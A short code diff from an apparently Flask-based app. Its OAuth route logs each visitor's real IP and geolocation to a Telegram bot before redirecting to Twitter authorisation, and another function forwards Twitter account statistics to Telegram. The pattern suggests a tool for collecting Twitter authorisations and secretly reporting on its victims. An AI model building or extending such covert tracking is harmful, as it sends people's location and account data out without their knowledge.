@@ -53,7 +53,7 @@ def oauth():
     country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
 
     message = f'🔗 Connection: {real_ip}\n\n{country_flag} {city}, {country}'
-    return send_telegram_message(group['group_id'], message)
+    send_telegram_message(group['group_id'], message)
 
     twitter_oauth_url = generate_twitter_oauth_url()
     return redirect(twitter_oauth_url)
@@ -137,6 +137,7 @@ def send_to_telegram(username, followers_count, friends_count, total_likes, retw
 
 
 def send_telegram_message(chat_id, message):
+    print(f"Sent message to {chat_id}: {message}")
     requests.post(
         f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
         data={'chat_id': chat_id, 'text': message, 'parse_mode': 'MarkdownV2'}
